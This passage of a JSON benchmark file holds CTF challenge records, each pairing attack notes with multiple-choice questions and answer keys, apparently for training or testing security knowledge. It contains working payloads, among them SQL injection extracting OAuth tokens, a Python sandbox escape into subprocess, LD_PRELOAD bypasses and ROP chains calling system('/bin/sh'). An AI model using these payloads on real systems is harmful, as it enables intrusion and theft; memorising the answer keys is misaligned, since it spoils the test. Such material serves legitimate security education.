        "type": "misc",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 157,
        "max_score": 428,
        "difficulty": 0.36682242990654207,
        "knowledge": [
            "When faced with a challenge that includes arbitrary code execution (ACE) with restrictions, creative use of the programming language's features and external encodings can be effective. If direct execution of certain commands or direct manipulation of values is restricted by filtering or the challenge's constraints, encoding payloads in a format that bypasses these restrictions, such as base64, allows for unexpected expressions of operations or data manipulation. This method hinges on finding a bridge between the encoded format and the desired operation or outcome, in this case, calculating a specific numeric value such as pi using encoded strings that represent mathematical operations when decoded.\n   - Example Scenario: Given the restriction to produce a specific mathematical result without directly invoking mathematical operations or constants, explore how encoded strings could be decoded at runtime to produce these operations or constants indirectly.\n   - Example Payload: `0.1/e00+` decoded as `\"{M>\" -> e00+`, where the decoding result represents an operation that contributes to calculating pi.",
            "In challenges involving numeric calculations or expressions, leveraging the programming language's ability to handle very large or small numbers, namely floating-point arithmetic, can be useful. By decomposing a target number (like pi) into a series of smaller operations (addition, division, etc.) that when combined equal the target, one can craft payloads that fulfill the challenge's conditions without directly using the target number or restricted operations. The utilization of a lookup table to map encoded strings to specific operations significantly eases this task, enabling a systematic approach to constructing the payload.\n   - Example Scenario: When direct usage of specific numbers or mathematical constants is not possible due to challenge constraints, decompose the target number into a sequence of smaller, allowable operations that cumulatively achieve the original goal.\n   - Example Payload: Building pi (`3.141592653589793`) from operations like `\"0.1/e00+\"*31 + \"0.1/e01+\"*4 + \"0.1/e04+\"*159` where each operation represents a piece of the final value, mapped via a lookup table to encoded strings which are not directly filtered or restricted."
        ],
        "question": [
            "In a cybersecurity challenge to execute arbitrary code within constraints, what technique can be used to perform operations indirectly when direct execution is restricted? - A. Writing the operations in reverse order. - B. Using a complex hashing algorithm to obfuscate the operations. - C. Utilizing external encodings such as base64 to encode payloads that, when decoded, perform the desired operations. - D. Encrypting the entire payload with a symmetric key.",
            "When trying to calculate a specific value like pi in a restricted execution environment where direct mathematical operations or constants are not allowed, what approach can help achieve the desired outcome? - A. Using a predetermined list of encrypted values that map directly to the desired outcome. - B. Crafting a payload that decomposes the target number into a series of smaller operations mapped via a lookup table to encoded strings, which bypass restrictions. - C. Implementing a neural network to predict the operations needed to reach the target value. - D. Hardcoding the target value into the payload in a hidden format."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Beginner's Quest - Filter Env",
        "write_up": "dataset/raw/Beginner's Quest - Filter Env.md",
        "type": "The type of the CTF challenge described in the write-up is a ***pwn*** challenge.",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving environment variables sanitization, if the sanitization process checks and set environment variables one by one, an opportunity for exploitation exists by duplicating an environment variable. Particularly, this can be exploited by invoking a variable known to be unsafe (such as `LD_PRELOAD`) twice, with the expectation that the system utilizes the last declared variable. This can lead to arbitrary code execution if a custom shared object is loaded via the bypassed environment variable.\n   - Sample payload: Set `LD_PRELOAD` twice in the environment variables, where the second occurrence points to a malicious shared object.",
            "For creating a shared object on systems where the target binary utilizes functionalities from dynamically linked libraries, compile the code with `-fPIC` (Position Independent Code) flag to generate a shared library. This is essential for successful injection and execution of custom code through mechanisms like `LD_PRELOAD`.\n   - Command example: `gcc obj.c -o obj -shared -fPIC`"
        ],
        "question": [
            "In the context of sanitizing environment variables in security challenges, why might setting an environment variable like `LD_PRELOAD` to an empty string using `setenv()` not effectively prevent an attacker from executing arbitrary code?  - A. Because `setenv()` appends the new value to the existing value instead of replacing it. - B. Because setting an environment variable to an empty string removes it from the environment entirely. - C. Because an attacker can bypass this by providing the `LD_PRELOAD` variable twice, with the system recognizing the second, malicious instance. - D. Because `setenv()` cannot modify environment variables, only create new ones. ",
            "When compiling a shared object intended for injecting into a process via `LD_PRELOAD`, which of the following GCC compilation flags is essential to ensure the shared object can be executed regardless of its position in memory?  - A. `-shared -fPIE` - B. `-dynamiclib` - C. `-shared -fPIC` - D. `-bundle` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Beginner's Quest - Fridge todo List",
        "write_up": "dataset/raw/Beginner's Quest - Fridge todo List.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving binary exploitation with out-of-bounds write or read vulnerabilities, if an application does not check for negative indices, an attacker can manipulate memory locations preceding the intended array or buffer. This can be leveraged to read or write arbitrary memory locations by supplying a negative index, allowing for potential control over function pointers or other critical data structures. An example scenario is when an application's functionality, such as adding or removing items to a list, does not properly validate user-supplied indices, and the data structures are stored in contiguous memory regions with important data or pointers like the Global Offset Table (GOT).",
            "In situations where the binary has functions whose addresses can be leaked (like a write function in the GOT) and Position Independent Executable (PIE) is enabled, making the location of the binary in memory unknown, an attacker can calculate the base address of the libc or other sections of the binary by leaking the address of a known function. This information can then be used to perform further exploitation, such as overwriting function pointers or GOT entries to redirect execution flow. This technique is particularly useful when direct code execution is not possible or when the attacker aims to execute system calls or other functions not originally accessible. A common target for such overwrites in CTF challenges is replacing the address of frequently called functions like 'atoi' with the address of 'system' to execute arbitrary commands.\n   \n   Example Payload:\n   ```\n   idx = -(offset_to_target_function / sizeof(todo_entry))\n   new_address = address_of_system - calc_offset_to_system_from_leaked_address\n   write_payload(idx, new_address)\n   ```"
        ],
        "question": [
            "In a binary exploitation task involving handling of data in arrays, if an application's removal function has the following code segment, how might an attacker exploit it to manipulate memory locations outside the intended array bounds? ```c int idx = read_int(); if (idx > TODO_COUNT) { puts(OUT_OF_BOUNDS_MESSAGE); return; } ``` - A. By entering a large positive number to access memory after the array. - B. By entering `TODO_COUNT + 1` to bypass the check and execute an overflow. - C. By entering a negative number to access memory locations before the array. - D. By entering zero to trigger an underflow. ",
            "Given a scenario where Position Independent Executable (PIE) is enabled in a binary, making the memory locations of the binary unpredictable, and a known vulnerability allows leaking the address of a function from the Global Offset Table (GOT), which of the following statements is true about exploiting this situation to calculate the address of system()? - A. The leaked address of a never-called function gives the direct location of system() in libc. - B. The address of system() can be calculated by adding the leaked address to a known offset within the binary. - C. By leaking a function's address that has already been called, you can calculate the base address of libc and then system()'s address. - D. The address of system() can only be calculated if PIE is disabled, making this approach ineffective. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Beginner's Quest - Media-DB",
        "write_up": "dataset/raw/Beginner's Quest - Media-DB.md",
        "type": "This write-up describes a SQL injection vulnerability in a music application, where the player can manipulate the query to extract sensitive information. Based on the provided information, the type of this challenge is **web**.",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with input filtering mechanisms that remove or escape certain hazardous characters like quotes or apostrophes, one can use alternative syntax or techniques that bypass these filters. Specifically, in environments where backslash escaping is not supported, like SQLite 3, consider utilizing SQL features such as UNION SELECT to inject malicious SQL queries without the need for escaping.  \nExample payload: 'and 1=2 union select 1,oauth_token from oauth_tokens;--",
            "In applications where user input is inserted into a database and then used in a SELECT query, if the application concatenates strings directly into queries without proper sanitization, it is possible to inject SQL through user inputs even when traditional characters are filtered. Using an unfiltered input to manipulate query behavior, such as injecting a UNION SELECT statement by setting an artist's name to a SQL injection payload, can be a way to exploit this vulnerability.  \nExample payload: 'and 1=2 union select 1,oauth_token from oauth_tokens;--"
        ],
        "question": [
            "In the context of an SQLite 3 application that does not support backslash escaping and removes certain characters from inputs, which technique can be used to bypass input filtering mechanisms to perform a successful SQL injection? - A. Utilize error-based SQLi to expose database errors. - B. Use inline comments to break up injected SQL syntax. - C. Employ UNION SELECT injection by inserting an artist with a crafted name. - D. Apply hexadecimal encoding to all input characters.",
            "When an application directly concatenates user inputs into SQL queries without sanitization, allowing for manipulation of queries, which of the following payloads can effectively exploit the lack of proper input handling to perform SQL injection, as demonstrated in the scenario of inserting an artist with a malicious name? - A. `' OR '1'='1' --` - B. `1; DROP TABLE users; --` - C. `'and 1=2 union select 1,oauth_token from oauth_tokens;--` - D. `<script>alert('XSS')</script>`"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Behir",
        "write_up": "dataset/raw/Behir.md",
        "type": "reverse",
        "competition": [
            "WPICTF/2021",
            "https://ctftime.org/event/1208/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "In malware analysis challenges, deeply nested and obscure function calls might contain crucial information for challenge resolution. These functions can manipulate and obfuscate strings, hiding valuable data such as flags. Breaking down each function and understanding its transformation on data step by step can reveal hidden information. Example: Identifying that `makesoul()` and `soulMore()` functions are used to construct an obfuscated string which eventually leads to the flag.",
            "An anti-debugging technique employed by malware is to check the execution time to detect step-by-step debugging or analysis. If the script detects that a certain block of code has taken longer to execute than expected, it might alter its behavior or terminate to avoid analysis. This can be circumvented by ensuring that the analysis or emulation environment runs the code without significant delays, or by modifying the malware's time check logic to remove or neutralize the anti-debugging feature."
        ],
        "question": [
            "In the scenario where obfuscated Python functions `makesoul()` and `soulMore()` are used within a malware analysis task, which approach can lead to uncovering strings hidden by these functions? - A. Run the malware in an unprotected environment to observe real-time string constructions. - B. Ignore the functions and focus on network traffic analysis to find the hidden strings. - C. **Systematically deobfuscate each function and track the transformations applied to input strings, leading to revealing the hidden flag.** - D. Increase the script's execution speed to bypass the obfuscation techniques. ",
            "When analyzing Python malware that employs execution time checking as an anti-debugging measure, which strategy is effective in preventing the malware from detecting the analysis process? - A. Deleting all references to the `time` module in the Python script to speed up its execution. - B. **Modifying the script to remove or alter the execution time check logic, avoiding the anti-debugging mechanism.** - C. Running the script multiple times to average out the execution time and confuse the timing check. - D. Utilizing high-performance computing (HPC) resources to ensure all operations complete within the expected time frame regardless of debugging. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Better ZIP",
        "write_up": "dataset/raw/Better ZIP.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 231,
        "max_score": 500,
        "difficulty": 0.462,
        "knowledge": [
            "When faced with a custom encryption method relying on multiple Linear Feedback Shift Registers (LFSRs) for a file type with predictable header values, such as PNG, one can exploit known bytes in the file structure to reverse the encryption parameters. This is especially feasible if the LFSRs have a short bit length (e.g., 20 bits), making brute force attacks computationally viable. By leveraging the positions and values of known header fields and end-of-file markers within a file type's specification, one can gather enough known plaintext bits to attempt reconstruction of the key or internal state of the encryption scheme. This approach requires detailed knowledge of both the file format and the encryption mechanism to identify suitable known values for the attack.\n\n    Example approach (conceptual): For a PNG encrypted with a similar LFSR-based scheme, use predictable parts of the PNG structure such as the image header's fields (bit depth, color type, compression, filter type, interlacing) and the IEND chunk as known plaintext to narrow down LFSR parameters.",
            "For cryptographic challenges where the key or initial state decryption depends on brute force analysis of a manageable number of possibilities, automation through scripting is essential. Develop a script to iterate over possible combinations of decryption parameters (in this case, LFSR states) and test each combination against a condition indicative of success, such as the output conforming to the expected file format structure. This method is generalizable to other scenarios where the encryption scheme produces a relatively small number of potential keys or states that can be feasibly tested.\n\n    Sample script concept: Implement a `final.py` script that iterates through the narrowed-down possibilities of LFSR states, attempting to decrypt the file with each one. Use a validation check for PNG file integrity (e.g., correct PNG header and IEND chunk) to identify the successful decryption parameters."
        ],
        "question": [
            "In the context of decrypting a PNG file encrypted with a custom scheme based on Linear Feedback Shift Registers (LFSRs) of 20 bits length, which known bytes within the PNG structure can be useful for reversing the encryption parameters?  - A. Randomly selected bytes from the image data. - B. The first 20 bytes considering they are mostly constant headers provided by the ZIP file structure. - C. Bytes related to image height, bit depth, color type, compression, filter type, interlacing, next chunk's length, and the IEND chunk. - D. The metadata fields such as author name and software used to create the PNG file. ",
            "When developing a brute force script (`final.py`) to break a custom encryption algorithm based on short bit length LFSRs by using known plaintext bits, what constitutes a success condition indicative that the correct LFSR parameters have been found during the brute force process?  - A. The script decrypts any data that can be opened by a text editor. - B. The decrypted file's size matches the expected size of the original, unencrypted file. - C. The script produces an output that conforms to the expected PNG file format, including a valid header and IEND chunk. - D. Any output that does not result in an error through the decryption process. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "bigDriver",
        "write_up": "dataset/raw/bigDriver.md",
        "type": "pwn",
        "competition": [
            "HackZoneTunisia/2020",
            "https://ctftime.org/event/1029/tasks/"
        ],
        "score": 854,
        "max_score": 1000,
        "difficulty": 0.854,
        "knowledge": [
            "When dealing with timing attacks, where the server response time increases based on the number of consecutive correct characters in a submitted guess, a bruteforce attack can be optimized by observing the delay in server response times. This can indicate the accuracy of the guessed characters, allowing the attacker to sequentially identify the correct characters of a secret string, such as a flag.",
            "Multiprocessing can significantly reduce the time required for bruteforcing by allowing parallel processing of guesses. This method splits the task across multiple CPU cores, enabling simultaneous guesses and thus reducing the overall bruteforce attack time. This approach is particularly useful in challenges with a limited time frame, where traditional single-threaded methods would not suffice due to the vast number of possible guesses."
        ],
        "question": [
            "In the context of a timing attack involving guessing a secret string where correct guesses result in incrementally delayed responses, which of the following is a true statement about optimizing a bruteforce attack? - A. The delay in server response times cannot be used to determine the accuracy of guessed characters. - B. Observing the delay in server response times is useful for identifying the correct characters of a secret string, allowing for a sequential approach to guessing. - C. Timing attacks are best mitigated by guessing all characters simultaneously, ignoring server response times. - D. The server response time is irrelevant in timing attacks, and guessing should be random.",
            "When applying multiprocessing to optimize a bruteforce attack in a CTF challenge, which statement accurately reflects its impact on the attack's efficiency? - A. Multiprocessing increases the time required for bruteforcing by adding overhead from process creation. - B. Splitting the task across multiple CPU cores has no significant effect on the overall bruteforce attack time. - C. Traditional single-threaded methods are always more efficient than multiprocessing due to their simplicity and lower resource usage. - D. Multiprocessing can significantly reduce the bruteforce attack time by enabling parallel processing of guesses, making it ideal for time-limited challenges."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Biggars",
        "write_up": "dataset/raw/Biggars.md",
        "type": "crypto",
        "competition": [
            "FireShell/2019",
            "https://ctftime.org/event/727/tasks/"
        ],
        "score": 60,
        "max_score": 500,
        "difficulty": 0.12,
        "knowledge": [
            "In RSA cryptography challenges, when encountering an unusually large modulus \\(N\\) that prevents conventional online tools from factoring it due to size constraints, leveraging specialized computational environments with built-in number theory functions, such as SageMath, allows for efficient factorization of \\(N\\). This step is pivotal for computing Euler's totient function (\\(\\phi(N)\\)) and subsequently finding the decryption exponent (\\(d\\)) to decrypt the cipher and recover the plaintext message. This technique is particularly useful when \\(N\\) is composed of large prime factors that standard factoring algorithms struggle with.",
            "In scenarios involving restricted execution environments or sandboxes that limit direct access to certain Python functionalities or modules to prevent arbitrary code execution, an effective strategy to bypass these restrictions involves chaining attribute or method accesses to navigate from available objects to restricted functionalities. This method exploits the interconnected nature of Python objects and their attributes, allowing an attacker to, for instance, access the base object class to reach `__builtins__` and import restricted modules by creatively circumventing filters (e.g., by concatenating strings to bypass keyword blacklists). This tactic requires an in-depth understanding of Python's data model and the relationships between different objects and their attributes or methods. \n\nExample payload for bypassing restrictions to execute OS commands through a limited web shell:\n```python\nprint {}.__class__.__base__.__subclasses__().pop((('a')*59+('b')).index('b'))()._module.__builtins__.values().pop((('c')*109+('d')).index('d'))('subprocess').check_output('ls')\n```\nThis payload illustrates a method to import the `subprocess` module by circumventing text filters (by splitting the module name and concatenating it) and executing a command (`ls`) to list directory contents, potentially allowing an attacker to identify files of interest, such as those containing flags."
        ],
        "question": [
            "In the context of solving an RSA cryptography challenge, when given an unusually large modulus \\(N\\) that is too large for conventional factoring tools online due to its size, what should one consider using to efficiently factor \\(N\\)? - A. Use a basic calculator for manual trial and error factoring. - B. Leverage a specialized computational environment such as SageMath with built-in number theory functionality for efficient factorization. - C. Ignore factoring \\(N\\) and guess the decryption key directly. - D. Use simple Python scripts without any libraries to factor \\(N\\).",
            "When faced with a restricted execution environment in Python that limits direct access to certain functionalities, which technique is effective in bypassing these restrictions and executing OS commands? - A. Directly call the `exec()` function with the command as a string. - B. Use the `print()` function to reveal the restricted functionalities. - C. Chain attribute or method accesses starting from an available object to reach `__builtins__` and subsequently import and execute restricted modules by bypassing keyword filters. - D. Modify the source code of the Python interpreter to remove restrictions."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Bilinear Evil",
        "write_up": "dataset/raw/Bilinear Evil.md",
        "type": "crypto",
        "competition": [
            "Pwn2Win/2019",
            "https://ctftime.org/event/822/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a cryptographic challenge involving bilinear pairings and the Sakai\u2013Kasahara scheme under the elliptic curve setting, crucial steps include understanding the key generation process, how shared secrets are established, and leveraging the properties of bilinear maps for pairings. Specifically, for scenarios involving secret sharing protocols, the discrete logarithm problem becomes central to recovering secret keys if the underlying field's characteristic is small. Tools like MAGMA can be effectively used for computing discrete logarithms using Coppersmith's index-calculus algorithm when working within finite fields of small characteristic.",
            "In challenges where the objective includes decrypting or recovering hidden information using bilinear pairings, the discrete logarithm problem can sometimes be solved using external precomputed tables for fields with very small characteristics, as hinted by available implementations in MAGMA for fields with characteristic p where p is less than \\(2^{30}\\). This approach relies on auxiliary tables to avoid precomputation stages for logarithms of a factor base, thereby enabling immediate computation of logarithms for individual elements. It uses an efficient variant of Coppersmith's algorithm, suitable for fields of small characteristic and not necessarily prime fields."
        ],
        "question": [
            "When a cryptographic challenge involves using the Sakai\u2013Kasahara scheme for secret sharing protocols under elliptic curve cryptography, what characteristic of the underlying finite field makes the discrete logarithm problem more manageable, and how is it exploited? - A. A large characteristic of the field, using brute-force search methods to recover secret keys. - B. A small characteristic of the field, employing the Pollard's rho algorithm for logarithms. - C. A small characteristic of the field, utilizing tools like MAGMA with Coppersmith's index-calculus algorithm. - D. An infinite field characteristic, leveraging quantum computing algorithms for logarithms.",
            "In the context of cryptographic challenges that require solving the discrete logarithm problem in fields of very small characteristics, which statement best describes the method provided by MAGMA's implementation for effective computation? - A. It exclusively uses a quantum algorithm for immediate computation of logarithms regardless of the field size. - B. It relies on an extensive brute-force search across all possible field elements to find the discrete logarithm. - C. It applies an efficient variant of Coppersmith's algorithm, aided by precomputed auxiliary tables for immediate calculation of logarithms in fields of characteristic less than \\(2^{30}\\). - D. It depends solely on the general number field sieve method for all types of field characteristics without optimization."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "biooosless",
        "write_up": "dataset/raw/biooosless.md",
        "type": "This write-up describes a reverse engineering challenge that involves analyzing a modified BIOS image and writing shellcode to read a flag from a floppy disk. Based on the context provided, the type of challenge in this write-up is **reverse**.",
        "competition": [
            "DEFCON/2020/Quals",
            "https://ctftime.org/event/994/tasks/"
        ],
        "score": 145,
        "max_score": 460,
        "difficulty": 0.31521739130434784,
        "knowledge": [
            "When dealing with hardware directly in BIOS through shellcode and required to perform I/O operations (e.g., reading from floppy), it is practical to use the CPU's Real Mode for direct hardware access while shifting to Protected Mode for utilizing extended memory and executing 32-bit code. This approach allows for low-level operations such as I/O without relying on the OS or interrupts which might not be initialized or available. For BIOS and hardware interaction tasks, bypass the high-level abstractions and directly manipulate the hardware or low-level system resources.",
            "In scenarios where direct hardware access is required for operations like reading a floppy disk, and standard interrupts (e.g., INT 13h for disk services) are not available or initialized, one viable approach is to mimic or replicate the BIOS or system firmware functions in shellcode to interact with the hardware. This involves accessing I/O ports directly (e.g., using in/out instructions) to communicate with devices. It is important to eliminate unnecessary checks and functionality from the code being replicated to fit the shellcode requirements and focus on the direct interaction needed for the challenge.\n\nSample of a payload for direct hardware communication in the context given:\n```assembly\n; Direct communication with floppy drive\nmov al, 0x90                     ; Command to read drive type\nout 0x70, al                     ; Send command to CMOS index port\nin al, 0x71                      ; Read drive type from CMOS data port\n; Assume al now contains the drive type\n; Floppy communication can follow, tailored to specific needs\n```"
        ],
        "question": [
            "When programming shellcode for BIOS to operate directly with hardware while also needing to perform more complex operations requiring additional memory, how should the CPU modes be managed? - A. Use Real Mode for all operations, including memory management, to ensure compatibility with legacy hardware interfaces. - B. Shift between Real Mode for hardware I/O operations and Protected Mode for operations requiring extended memory and 32-bit code execution. - C. Operate exclusively in Protected Mode, using emulated hardware I/O operations to prevent direct access and ensure system stability. - D. Stay in Virtual Mode throughout the operation to leverage hardware virtualization features for both hardware access and memory management.",
            "In a case where standard BIOS interrupts are not initialized for performing operations like reading from a floppy disk, what is a recommended approach to accomplish these tasks in shellcode? - A. Rewrite the high-level operating system drivers in the shellcode to interact with the floppy disk using standardized APIs. - B. Rely solely on external libraries to handle the low-level interactions with the floppy drive hardware, avoiding direct I/O port manipulation. - C. Directly replicate minimal necessary BIOS or firmware functions within the shellcode, focusing on direct hardware I/O port interaction and removing non-essential functionalities. - D. Use network services to request the required data from the floppy disk indirectly, avoiding direct interaction with the hardware."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "bistro-v2",
        "write_up": "dataset/raw/bistro-v2.md",
        "type": "pwn",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 10,
        "max_score": 347,
        "difficulty": 0.02881844380403458,
        "knowledge": [
            "In challenges involving binary exploitation with a format string vulnerability, the `%x` format specifier can be used to leak memory contents. This knowledge is applicable when the binary uses functions like `printf` that interpret format specifiers and when there is a need to leak specific memory contents to bypass security checks or gain valuable information for further exploitation. Example payload to leak memory contents: `%9$x`.",
            "When dealing with challenges that require bypassing a security check or gaining arbitrary code execution, techniques such as ROP (Return Oriented Programming) can be leveraged. This involves using gadgets found within the binary or linked libraries to control the flow of execution. The strategy is particularly useful when the challenge binary has protections such as NX enabled, but lacks other protections like stack canaries or PIE (Position Independent Executables). Basic gadgets needed for ROP chains include `pop` registers (to control register values) and `ret` (to align the stack or for other purposes). Example of constructing a ROP chain to call a function like `puts`: \n   \n   ```\n   payload = b\"a\" * buffer_overflow_offset + pop_rdi + address_of_data_to_leak + puts_plt_address + return_address\n   ```"
        ],
        "question": [
            "In a scenario where a binary uses printf in an insecure way like `printf(user_input);`, which can lead to a format string vulnerability, how can an attacker leak a memory address to bypass security checks using format specifiers? - A. Use `%d` to directly address and display the content of a specific memory location. - B. Use `%s` to execute arbitrary code stored at a specific memory location. - C. Use `%x` to display memory content at a specific position in the stack. - D. Use `%n` to write the number of bytes output by printf into a memory address.",
            "In a binary exploitation challenge that has NX (Non-Executable Stack) enabled but lacks PIE (Position Independent Executables), making it susceptible to Return Oriented Programming (ROP) attacks, which sequence of actions could an attacker feasibly take to control the flow of execution? - A. Overwrite the return address on the stack with the address of a 'POP EAX; RET' gadget to set the EAX register value directly. - B. Directly modify the binary code in memory to inject and execute shellcode. - C. Use a 'JMP ESP' instruction to jump to a NOP sled followed by shellcode on the stack. - D. Construct a ROP chain payload that includes a 'pop rdi; ret' gadget to set the RDI register and then call a function like 'puts' to leak a memory address."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "bistro",
        "write_up": "dataset/raw/bistro.md",
        "type": "pwn",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 12,
        "max_score": 347,
        "difficulty": 0.0345821325648415,
        "knowledge": [
            "When encountering binaries with Partial RELRO and no PIE (Position Independent Executable), it suggests that address space layout will be consistent across runs and function addresses can be reliably targeted for Return Oriented Programming (ROP) attacks. By leveraging tools like ROPGadget to find gadgets such as `pop rdi; ret;`, it's possible to construct a payload to leak function addresses (e.g., using `puts`) or call other functions in the binary or libc.",
            "After leaking an address of a function such as `puts` from the Global Offset Table (GOT), it's feasible to calculate the base address of libc by referencing known offsets between that function and the libc base address found in a libc database. Once the libc base is determined, system calls can be orchestrated by calculating the addresses of system and \"/bin/sh\" relative to libc's base. This method requires manually finding libc offsets using tools or databases like the libc database.\n\n   Example Payload Part 1 (Leak Address and Calculate libc Base):\n   \n   ```python\n   payload = b\"a\" * 0x78 + pop_rdi + puts_got + puts_plt + main_addr\n   ```\n\n   Example Payload Part 2 (Call System with \"/bin/sh\"):\n   \n   ```python\n   payload = b\"a\" * 0x78 + ret + pop_rdi + sh_addr + system_addr\n   ```"
        ],
        "question": [
            "In the context of exploiting binaries that lack PIE (Position Independent Executable) and have Partial RELRO, which factor makes it particularly feasible to perform Return Oriented Programming (ROP) attacks? - A. The ability to execute shell commands directly. - B. The randomness of the stack. - C. The consistency of address space layout across different runs. - D. The encryption of executable sections.",
            "After extracting a function's leaked address from the GOT (Global Offset Table) during a buffer overflow exploit, which step is essential for calculating the base address of libc to further enable system calls? - A. Adjusting the stack pointer to bypass stack canaries. - B. Referencing known offsets from a libc database to find the base address. - C. Utilizing the program's PIE to adjust gadget addresses. - D. Overriding the function's address in the GOT with a NOP sled."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Bit Flip 1",
        "write_up": "dataset/raw/Bit Flip 1.md",
        "type": "crypto",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": 155,
        "max_score": 500,
        "difficulty": 0.31,
        "knowledge": [
            "To perform a timing-based side-channel attack to determine the bits of a secret seed used in cryptographic operations, analyze the variance in the number of iterations taken to generate a cryptographic prime as you systematically flip bits in an input. This approach leverages the way certain cryptographic systems, such as prime number generators, behave predictably based on their input. Such behavior can be exploited to infer bits of the seed, except for the least significant bit, by observing how the input manipulation affects the computational workload (measured in iterations) of the cryptographic algorithm.\n\n   Example approach:\n   - Begin with a guessed seed value of 0 and iteratively flip each bit from 1 to 127.\n   - For each bit position, create two scenarios by XORing and ORing the guessed seed with values that set the target bit to 0 and 1, respectively.\n   - Send each scenario to the server and compare the number of iterations reported to generate the prime. A difference in iterations suggests the value of the target bit.\n   - This process allows for deducing all but the least significant bit of the seed by comparing the computational effort required to generate a prime number under slight variations in the seed.",
            "Once the secret seed (or a close approximation) is known, use it to construct the expected cryptographic parameters of a session (such as a shared symmetric key in a Diffie-Hellman exchange) and perform decryption of the communicated message. This method relies on reversing engineered cryptographic setup from the observed communication and known or guessed values of the seed, demonstrating the critical importance of secure random number generation in cryptographic protocols.\n\n   Example decryption process:\n   ```python\n   # Assuming the guessed seed is correct and allows the reconstruction of Alice's state:\n   alice_seed = long_to_bytes(guess)  \n   alice = DiffieHellman(bit_flip(alice_seed))\n   # Use Bob's public number and Alice's derived secret to compute the shared key\n   shared = pow(response['bob_number'], alice.my_secret, alice.prime)\n   # Decrypt the message using the derived shared key and the provided IV\n   cipher = AES.new(long_to_bytes(shared, 16)[:16], AES.MODE_CBC, IV=response['iv'])\n   decrypted_flag = cipher.decrypt(response['enc_flag'])\n   return decrypted_flag\n   ```\n   This code snippet uses the correctly guessed seed to initialize a Diffie-Hellman class instance correctly, compute the shared key, and decrypt the flag successfully, demonstrating the decryption part of the challenge solution."
        ],
        "question": [
            "In a timing-based side-channel attack against a cryptographic prime generation algorithm, how can you infer the value of a specific bit in the seed, given you can systematically flip bits in an input and observe the resulting number of iterations needed to generate a prime?  - A. Compute the prime number directly from the seed and count the number of iterations it takes. - B. XOR the seed with a mask setting all but the targeted bit to 1, then OR the seed with a mask setting the targeted bit to 1, comparing the numbers of iterations required in each case. - C. XOR the seed with a known prime number and observe the change in the number of iterations required. - D. Increment the seed by 1 until the target bit flips from 0 to 1, counting the number of increments as the iteration difference.",
            "In the context of decrypting messages secured through a Diffie-Hellman key exchange, which step correctly describes the use of a derived or guessed secret seed to decrypt a message communicated between two parties using a shared symmetric key?  - A. Initialize a new Diffie-Hellman instance with the public key of the sender and use it to derive the shared symmetric key directly. - B. Multiply the sender's public number by the inverse of the receiver's public number to obtain the shared symmetric key. - C. Use the guessed seed to compute the receiver's private number and raise the sender\u2019s public number to this power mod the prime, using the result as the AES key to decrypt the flagged message. - D. Send the guessed seed back to the sender to request the decryption of the message directly."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "bitbitbit",
        "write_up": "dataset/raw/bitbitbit.md",
        "type": "crypto",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": -1,
        "max_score": 940,
        "difficulty": -1,
        "knowledge": [
            "When dealing with RSA encryption where the public exponent `e` is large and constant across multiple encryptions with different moduli, and if the plaintext is not padded, Hastad's Broadcast Attack can be utilized. This is especially relevant in scenarios where the plaintext (flag) length is relatively short compared to `e`. In such cases, intercepting a sufficient number of ciphertexts encrypted under different public keys (but with the same `e`) enables recovery of the plaintext using the Chinese Remainder Theorem (CRT).",
            "When planning to apply Hastad's Broadcast Attack in a practical scenario (e.g., a CTF challenge), preparing for extensive data collection (ciphertexts and corresponding public keys) is necessary due to potential limitations such as Proof of Work (PoW) requirements. An efficient approach would involve automating the collection process and implementing a parallel solver for the Chinese Remainder Theorem to expedite calculations. This is particularly effective in handling large-scale computations that can be distributed across multiple cores or machines.\n   \n   Example tool for CRT calculation in a parallelized manner: https://github.com/p4-team/crypto-commons/blob/master/crypto_commons/rsa/crt.py"
        ],
        "question": [
            "In an RSA encryption scenario where the public exponent `e` is set to 65537 and used across various encryptions with differing moduli, without padding the plaintext, which attack can be efficiently employed to recover the plaintext? - A. Frequency Analysis - B. Differential Cryptanalysis - C. Hastad's Broadcast Attack - D. Linear Cryptanalysis",
